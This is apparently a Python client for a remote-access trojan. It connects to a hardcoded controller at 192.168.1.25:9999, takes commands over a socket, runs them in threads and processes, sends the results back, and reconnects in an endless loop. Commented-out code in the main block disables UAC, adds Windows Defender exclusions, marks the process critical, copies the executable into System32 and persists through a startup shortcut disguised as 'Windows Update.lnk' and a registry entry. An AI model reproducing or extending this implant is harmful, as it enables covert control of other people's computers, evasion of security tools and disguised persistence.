import json
import multiprocessing
import socket
import threading
import time
import queue
from enum import Enum
from typing import Dict, List, Tuple
from dependencies.modules.module_network_handler import handle_module , handle_continous_func
from concurrent.futures import ThreadPoolExecutor

class InitCommands(Enum):
    START_PINGER_INIT_COMMAND: str = "PINGER"



class Client:
    def __init__(self, IP: str, PORT: int, CLIENT_STRING: str = "client", LEN_SIZE: int = 100000) -> None:
        self.LEN_SIZE: int = LEN_SIZE
        self.CLIENT_STRING: str = CLIENT_STRING
        self.ip: str = IP
        self.port: int = PORT
        self.main_socket: socket.socket = None

        self.non_continous_commands_to_be_executed = queue.Queue()
        self.continous_commands_to_be_executed = queue.Queue()
        self.results = queue.Queue()
        self.exceptions = queue.Queue()

        self.running_continous_commands: List[Tuple[multiprocessing.Process, Dict]] = []

    def send_message(self, message: str, con: socket.socket, encode: bool = True) -> None:
        length_of_message = str(len(message))
        spaces_to_add = self.LEN_SIZE - len(length_of_message)
        message = length_of_message + " "*spaces_to_add + message
        if encode:
            con.send(message.encode())
        else:
            con.send(message)

    def recieve(self, con: socket.socket, decode: bool = True) -> str | bytes:
        while True:
            message = con.recv(self.LEN_SIZE).decode('utf-8')
            message_size = int(message)
            return (
                con.recv(message_size).decode("utf-8")
                if decode
                else con.recv(message_size)
            )


    def generate_initialization_message(self, role: str, username: str, password: str) -> str:
        init_dict = {"role": role, "username" : username, "password" : password}
        return json.dumps(init_dict)


    def generate_server_command(self, command: str) -> str:
        return json.dumps({"server_command" : command})

    def connect(self, is_normal: bool, server_command: str = "") -> socket.socket:
        initalization_message = self.generate_initialization_message(self.CLIENT_STRING, "USERNAME", "PASSWORD")
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((self.ip, self.port))
        self.send_message(initalization_message, s)
        if is_normal:
            self.send_message(self.generate_server_command("None"), s)
        else:
            self.send_message(self.generate_server_command(server_command), s)
        return s

    def init_main_sock(self) -> None:
        self.main_socket = self.connect(True)

    def __ping(self, ip: int, port: str) -> None:
            try:
                s = self.connect(is_normal = False, server_command = InitCommands.START_PINGER_INIT_COMMAND)
                data = json.dumps({"ip" : ip, "port" : port}) 
                while True:
                    self.send_message(data, s)
                    time.sleep(5)
            except Exception as e:
                print(e, "ping")
                self.exceptions.put(e)

    def start_pinger(self) -> None:
        if self.main_socket:
            ip, port = self.main_socket.getsockname()
            t = threading.Thread(target = self.__ping, args = (ip, str(port)))
            t.start()
        else:
            raise ValueError("Main socket does not exist.")

    def start_recieving_commands(self) -> None:
        try:
            while True:
                message = self.recieve(self.main_socket)
                m = json.loads(message)
                try:
                    if m["continous"] == True:
                        self.continous_commands_to_be_executed.put(message)
                    else:
                        self.non_continous_commands_to_be_executed.put(message)
                except Exception:
                    self.non_continous_commands_to_be_executed.put(message)
        except Exception as e:
            print(e, "reciever")
            self.exceptions.put(e)
    
    def execute_continous_commands(self) -> None:
        while True:
            command = self.continous_commands_to_be_executed.get()
            queue = multiprocessing.Queue()
            p = multiprocessing.Process(target = handle_continous_func, args = (queue, command))
            t = threading.Thread(target = self.mp_queue_to_result_queue, args = (queue, ))
            self.running_continous_commands.append((p, json.loads(command)))
            t.start()
            p.start()

    def mp_queue_to_result_queue(self, queue:multiprocessing.Queue) -> None:
        while True:
            data = queue.get()
            self.results.put(data)

    

    def execute_non_continous_commands(self) -> None:
        while True:
            if self.non_continous_commands_to_be_executed.qsize() > 3:
                thread_c = self.non_continous_commands_to_be_executed.qsize() + 1
                thread_c = min(thread_c, 98)
                futures = []#cannot schedule new futures after interpreter shutdown
                with ThreadPoolExecutor(max_workers = 100) as executor:
                    for _ in range(thread_c):
                        command = self.non_continous_commands_to_be_executed.get()
                        try:
                            futures.append((executor.submit(handle_module, command, self)))
                        except Exception:
                            self.results.put(handle_module(command, self))

                for future in futures:
                    self.results.put(future.result())
            else:
                command = self.non_continous_commands_to_be_executed.get()
                self.results.put(handle_module(command,self))


    def send_results(self) -> None:
        while True:
            self.send_message(self.results.get(), self.main_socket)


    def start_execution(self) -> None:
        self.recieving_thread = threading.Thread(target = self.start_recieving_commands)
        self.execution_nc_thread = threading.Thread(target = self.execute_non_continous_commands)
        self.execution_c_thread = threading.Thread(target = self.execute_continous_commands)
        self.sender_thread = threading.Thread(target = self.send_results)
        self.recieving_thread.start()
        self.execution_c_thread.start()
        self.execution_nc_thread.start()
        self.sender_thread.start()





if __name__ == "__main__":
    # run_single = RunSingle()
    # multiprocessing.freeze_support()
    # persist.Defender.add_extension_exclusion("exe")
    # persist.Defender.stop_sampling()
    # uac = persist.UAC()
    # uac.disable()
    # cp = persist.CriticalProcess()
    # cp.protect_process()
    # try:
    #     new_path = os.path.join(SYSTEM_32, sys.executable.split("\\")[-1])
    #     FileSystem.move_file(sys.executable, new_path)
    # except:
    #     try:
    #         new_path = os.path.join(THEMES_PATH, sys.executable.split("\\")[-1])
    #         FileSystem.move_file(sys.executable, new_path)
    #     except:
    #         new_path = sys.executable

    # startup = persist.Startup()
    # startup.persist_shortcut(new_path, "Windows Update.lnk", kill_on_delete = True)
    # startup.add_to_registry(new_path, sys.executable.split("\\")[-1])
    
    while True:
        try:
            client = Client("192.168.1.25", 9999)
            client.init_main_sock()
            client.start_pinger()
            client.start_execution()
            while True:
                if client.exceptions.qsize() != 0:
                    raise Exception("Error recieving")
                time.sleep(2)
        except:
            print("Retrying")